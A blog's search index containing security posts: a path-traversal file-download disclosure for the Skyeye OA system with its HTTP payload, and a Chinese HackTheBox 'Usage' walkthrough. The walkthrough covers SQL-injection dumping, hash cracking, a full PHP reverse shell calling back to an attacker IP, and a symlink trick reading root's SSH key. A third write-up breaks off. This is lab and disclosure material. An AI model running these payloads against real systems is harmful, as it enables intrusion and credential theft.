<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Skyeye has an arbitrary file download vulnerability</title>
    <link href="/2025/04/13/Skyeye%20has%20an%20arbitrary%20file%20download%20vulnerability/"/>
    <url>/2025/04/13/Skyeye%20has%20an%20arbitrary%20file%20download%20vulnerability/</url>
    
    <content type="html"><![CDATA[<h3 id="Product-Introduction"><a href="#Product-Introduction" class="headerlink" title="Product Introduction"></a><strong>Product Introduction</strong></h3><p>Skyeye Cloud-Intelligent Office OA System [SpringBoot2-Rapid Development Platform] is designed for management in institutions such as hospitals, schools, and small-to-medium enterprises. It integrates diverse advanced functionalities including online file operations, log management, attendance tracking, CRM, ERP inventory management, project management, drag-and-drop questionnaire builder, scheduling, note-taking, task planning, administrative functions, and other complex business processes.</p><h3 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a><strong>Vulnerability Analysis</strong></h3><p><img src="/.io//Blog\source_posts\assets\wps1.jpg" alt="img"> </p><p>\skyeye\skyeye-promote\skyeye-code-doc\src\main\java\com\skyeye\eve\controller\CodeModelHistoryController.java</p><p><img src="/.io//Blog\source_posts\assets\wps2.jpg" alt="img"> </p><p>\skyeye\skyeye-promote\skyeye-code-doc\src\main\java\com\skyeye\eve\service\impl\CodeModelHistoryServiceImpl.java</p><p><img src="/.io//Blog\source_posts\assets\wps3.jpg" alt="img"> </p><p>After receiving the filePath parameter submitted by a user, the system does not implement any security filtering measures (such as path normalization, blacklist validation, etc.). Instead, it directly concatenates the parameter with the base directory path as a string and executes file download operations based on the resulting full path. Due to the lack of validation for user input legitimacy, attackers can craft malicious parameters containing path traversal sequences (e.g., ..&#x2F;..&#x2F;etc&#x2F;passwd) to achieve arbitrary file downloads from the server.</p><p><strong>Vulnerability</strong> <strong>Reproduction</strong></p><p><img src="/.io//Blog\source_posts\assets\wps4.jpg" alt="img"> </p><p><img src="/.io//Blog\source_posts\assets\wps5.jpg" alt="img"> </p><p><img src="/.io//Blog\source_posts\assets\wps6.jpg" alt="img"> </p><p><img src="/.io//Blog\source_posts\assets\wps7.jpg" alt="img"> </p><p><img src="/.io//Blog\source_posts\assets\wps8.jpg" alt="img"> </p><p>Configuration templates and code generation options can be freely entered. After clicking “Download,” intercept the network traffic (e.g., via packet capture tools), modify the filePath parameter to include path traversal sequences (e.g., ..&#x2F;..&#x2F;etc&#x2F;passwd), and exploit the vulnerability to achieve arbitrary file downloads from the server.</p><p><img src="/.io//Blog\source_posts\assets\1.png" alt="img"> </p><p><img src="/.io//Blog\source_posts\assets\2.png" alt="img"> </p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a><strong>Payload</strong></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/dev/reqBase/codemodel017?filePath=../../../../../Windows/win.ini</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;133&quot;, &quot;Chromium&quot;;v=&quot;133&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>cross-site<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://119.91.201.97:8088/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br, zstd<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>HttpOnly<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Usage(HTB)</title>
    <link href="/2024/06/09/Usage-HTB/"/>
    <url>/2024/06/09/Usage-HTB/</url>
    
    <content type="html"><![CDATA[<p>写在前面，文章中的大多数内容在网上可以找到，我是为了在记录总结中学习，故此写下这篇文章</p><p>探测开放端口和服务</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs less">└─# <span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-sT</span> <span class="hljs-selector-tag">-sV</span> <span class="hljs-selector-tag">-sC</span> <span class="hljs-selector-tag">-O</span> <span class="hljs-selector-tag">-p22</span>,<span class="hljs-number">80</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.18</span> <br><span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-number">7.94S</span><span class="hljs-selector-tag">VN</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-06-06 03:12 EDT</span><br>Nmap scan report for usage.htb (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.18</span>)<br>Host is up (<span class="hljs-number">0.49s</span> latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">6</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-attribute">ssh-hostkey</span>: <br>|   <span class="hljs-number">256</span> <span class="hljs-attribute">a0</span>:<span class="hljs-attribute">f8</span>:<span class="hljs-attribute">fd</span>:<span class="hljs-attribute">d3</span>:<span class="hljs-number">04</span>:<span class="hljs-attribute">b8</span>:<span class="hljs-number">07</span>:<span class="hljs-attribute">a0</span>:<span class="hljs-number">63</span>:<span class="hljs-attribute">dd</span>:<span class="hljs-number">37</span>:<span class="hljs-attribute">df</span>:<span class="hljs-attribute">d7</span>:<span class="hljs-attribute">ee</span>:<span class="hljs-attribute">ca</span>:<span class="hljs-number">78</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-attribute">bd</span>:<span class="hljs-number">22</span>:<span class="hljs-attribute">f5</span>:<span class="hljs-number">28</span>:<span class="hljs-number">77</span>:<span class="hljs-number">27</span>:<span class="hljs-attribute">fb</span>:<span class="hljs-number">65</span>:<span class="hljs-attribute">ba</span>:<span class="hljs-attribute">f6</span>:<span class="hljs-attribute">fd</span>:<span class="hljs-number">2</span><span class="hljs-attribute">f</span>:<span class="hljs-number">10</span>:<span class="hljs-attribute">c7</span>:<span class="hljs-number">82</span>:<span class="hljs-number">8</span>f (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    nginx <span class="hljs-number">1.18</span>.<span class="hljs-number">0</span> (Ubuntu)<br>|<span class="hljs-attribute">_http-server-header</span>: nginx/<span class="hljs-number">1.18</span>.<span class="hljs-number">0</span> (Ubuntu)<br>|<span class="hljs-attribute">_http-title</span>: Daily Blogs<br><span class="hljs-attribute">Warning</span>: OSScan results may be unreliable because we could <span class="hljs-keyword">not</span> find at least <span class="hljs-number">1</span> open <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> closed port<br>Aggressive OS <span class="hljs-attribute">guesses</span>: Linux <span class="hljs-number">4.15</span> - <span class="hljs-number">5.8</span> (<span class="hljs-number">96%</span>), Linux <span class="hljs-number">5.3</span> - <span class="hljs-number">5.4</span> (<span class="hljs-number">95%</span>), Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span> (<span class="hljs-number">95%</span>), Linux <span class="hljs-number">5.0</span> - <span class="hljs-number">5.5</span> (<span class="hljs-number">95%</span>), Linux <span class="hljs-number">3.1</span> (<span class="hljs-number">95%</span>), Linux <span class="hljs-number">3.2</span> (<span class="hljs-number">95%</span>), AXIS <span class="hljs-number">210</span>A or <span class="hljs-number">211</span> Network Camera (Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">17</span>) (<span class="hljs-number">95%</span>), ASUS RT-N56U WAP (Linux <span class="hljs-number">3.4</span>) (<span class="hljs-number">93%</span>), Linux <span class="hljs-number">3.16</span> (<span class="hljs-number">93%</span>), Linux <span class="hljs-number">5.0</span> (<span class="hljs-number">93%</span>)<br>No exact OS matches for host (test conditions non-ideal).<br>Network <span class="hljs-attribute">Distance</span>: <span class="hljs-number">2</span> hops<br>Service <span class="hljs-attribute">Info</span>: <span class="hljs-attribute">OS</span>: Linux; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:linux_kernel<br><br>OS <span class="hljs-keyword">and</span> Service detection performed. Please report any incorrect results at <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">38.91</span> seconds<br></code></pre></td></tr></table></figure><p>然后扫描目录和子域名  发现 <code>http://admin.usage.htb</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>amass<span class="hljs-regexp">/subdomains-top1mil-5000.txt -u http:/</span><span class="hljs-regexp">/usage.htb/</span> -H <span class="hljs-string">&quot;Host:FUZZ.usage.htb&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencodeed&quot;</span> -c -fs <span class="hljs-number">178</span><br></code></pre></td></tr></table></figure><p>我们测试的过程中 发现重置密码出存在sql注入</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap -r <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--level</span> <span class="hljs-number">5</span> <span class="hljs-attr">--risk</span> <span class="hljs-number">3</span> -D usage_blog -T admin_users -C username,password <span class="hljs-attr">--threads</span> <span class="hljs-number">10</span> <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span> <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/179.png"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">└─# john <span class="hljs-comment">--wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><br>Created directory: /root/.john<br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (bcrypt [Blowfish <span class="hljs-number">32</span>/<span class="hljs-number">64</span> X3])<br><span class="hljs-keyword">Cost</span> <span class="hljs-number">1</span> (iteration count) <span class="hljs-keyword">is</span> <span class="hljs-number">1024</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>whatever1        (?) <br></code></pre></td></tr></table></figure><p>登录后台  搜索发现漏洞   <strong>laravel-admin任意文件上传漏洞（CVE-2023-24249）</strong></p><p>创建 1.jpg</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br><span class="hljs-regexp">//</span> php-reverse-shell - A Reverse Shell implementation <span class="hljs-keyword">in</span> PHP. Comments stripped to slim it down. RE: https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/pentestmonkey/</span>php-reverse-shell<span class="hljs-regexp">/master/</span>php-reverse-shell.php<br><span class="hljs-regexp">//</span> Copyright (C) <span class="hljs-number">2007</span> pentestmonkey@pentestmonkey.net<br><br>set_time_limit (<span class="hljs-number">0</span>);<br><span class="hljs-variable">$VERSION</span> = <span class="hljs-string">&quot;1.0&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;10.10.16.26&#x27;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-number">9001</span>;<br><span class="hljs-variable">$chunk_size</span> = <span class="hljs-number">1400</span>;<br><span class="hljs-variable">$write_a</span> = null;<br><span class="hljs-variable">$error_a</span> = null;<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;uname -a; w; id; sh -i&#x27;</span>;<br><span class="hljs-variable">$daemon</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$debug</span> = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">&#x27;pcntl_fork&#x27;</span>)) &#123;<br><span class="hljs-variable">$pid</span> = pcntl_fork();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -<span class="hljs-number">1</span>) &#123;<br>printit(<span class="hljs-string">&quot;ERROR: Can&#x27;t fork&quot;</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-regexp">//</span> Parent exits<br>&#125;<br><span class="hljs-keyword">if</span> (posix_setsid() == -<span class="hljs-number">1</span>) &#123;<br>printit(<span class="hljs-string">&quot;Error: Can&#x27;t setsid()&quot;</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-variable">$daemon</span> = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>printit(<span class="hljs-string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);<br>&#125;<br><br>chdir(<span class="hljs-string">&quot;/&quot;</span>);<br><br>umask(<span class="hljs-number">0</span>);<br><br><span class="hljs-regexp">//</span> Open reverse connection<br><span class="hljs-variable">$sock</span> = fsockopen(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123;<br>printit(<span class="hljs-string">&quot;$errstr ($errno)&quot;</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-variable">$descriptorspec</span> = array(<br>   <span class="hljs-number">0</span> =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  <span class="hljs-regexp">//</span> stdin is a pipe that the child will read from<br>   <span class="hljs-number">1</span> =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  <span class="hljs-regexp">//</span> stdout is a pipe that the child will write to<br>   <span class="hljs-number">2</span> =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)   <span class="hljs-regexp">//</span> stderr is a pipe that the child will write to<br>);<br><br><span class="hljs-variable">$process</span> = proc_open(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$process</span>)) &#123;<br>printit(<span class="hljs-string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br>stream_set_blocking(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);<br>stream_set_blocking(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);<br>stream_set_blocking(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);<br>stream_set_blocking(<span class="hljs-variable">$sock</span>, <span class="hljs-number">0</span>);<br><br>printit(<span class="hljs-string">&quot;Successfully opened reverse shell to $ip:$port&quot;</span>);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$sock</span>)) &#123;<br>printit(<span class="hljs-string">&quot;ERROR: Shell connection terminated&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123;<br>printit(<span class="hljs-string">&quot;ERROR: Shell process terminated&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-variable">$read_a</span> = array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-variable">$num_changed_sockets</span> = stream_select(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, null);<br><br><span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;SOCK READ&quot;</span>);<br><span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;SOCK: $input&quot;</span>);<br>fwrite(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$input</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDOUT READ&quot;</span>);<br><span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$chunk_size</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDOUT: $input&quot;</span>);<br>fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDERR READ&quot;</span>);<br><span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$chunk_size</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDERR: $input&quot;</span>);<br>fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>&#125;<br>&#125;<br><br>fclose(<span class="hljs-variable">$sock</span>);<br>fclose(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);<br>fclose(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);<br>fclose(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br>proc_close(<span class="hljs-variable">$process</span>);<br><br><span class="hljs-keyword">function</span> printit (<span class="hljs-variable">$string</span>) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123;<br>print <span class="hljs-string">&quot;$string\n&quot;</span>;<br>&#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>上传后 监听 9001端口 ，然后下载文件就会反弹shell</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">python3 -c &#x27;<span class="hljs-keyword">import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27; <span class="hljs-comment">#创建交互试终端</span><br></code></pre></td></tr></table></figure><p>我们查看 目录 &#x2F;home&#x2F;dash 下所有文件 当打开 <code>.monitrc</code> 文件时里面有密码，尝试登录root用户发现不可以， 但是可以登录 xander</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/180.png"></p><p><code>strings</code>命令用于从二进制文件中提取可打印的字符串</p><p>strings &#x2F;usr&#x2F;bin&#x2F;usage_management</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/181.png"></p><p>上述用红色箭头标注  有一个 * 通配符 <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html<br><span class="hljs-built_in">touch</span> @root.txt<br><span class="hljs-built_in">ln</span> -s /root/root.txt<br>sudo /usr/bin/usage_management<br>choose 1    <span class="hljs-comment">#这样可以读取root.txt的内容</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html<br><span class="hljs-built_in">touch</span> @id_rsa<br><span class="hljs-built_in">ln</span> -s /root/.ssh/id_rsa id_rsa<br>choose 1       <span class="hljs-comment">#读取root用户登录凭证  ssh -i ./id_rsa root@10.10.11.18</span><br></code></pre></td></tr></table></figure><p>我第一次打开靶机的时候发现了开放了8083端口 下载就是dash用户的登录凭证(估计是靶机出了点问题)</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/178.png"></p><p>我们访问 <code>http://10.10.11.18:8083</code> 发现泄露了私钥，我们下载私钥尝试登录 提示我们</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/177.png"></p><p>你收到的错误信息 <code>Permissions 0644 for &#39;./id_rsa&#39; are too open. It is required that your private key files are NOT accessible by others.</code> 意味着你的私钥文件 <code>id_rsa</code> 的权限过于宽松，可能允许其他用户读取这个文件。这是一个安全隐患，因此 SSH 客户端拒绝使用这个私钥文件进行认证。</p><p>使用 <code>chmod</code> 命令更改 <code>id_rsa</code> 文件的权限</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> chmod <span class="hljs-number">600</span> id_rsa<br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -i .\id_rsa  dash@<span class="hljs-number">10.10.11.18</span>  <span class="hljs-comment">#成功连接</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>THB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BoardLight(HTB)</title>
    <link href="/2024/06/05/BoardLight-HTB/"/>
    <url>/2024/06/05/BoardLight-HTB/</url>
    
    <content type="html"><![CDATA[<p>写在前面，文章中的大多数内容在网上可以找到，我是为了在记录总结中学习，故此写下这篇文章</p><p>首先我们先探测开放端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p- -min-rate <span class="hljs-number">1000</span> <span class="hljs-number">10.10.11.11</span><br></code></pre></td></tr></table></figure><p>更细致的探测</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT -sV -sC -O -p80,<span class="hljs-number">22</span> <span class="hljs-number">10.10.11.11</span><br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 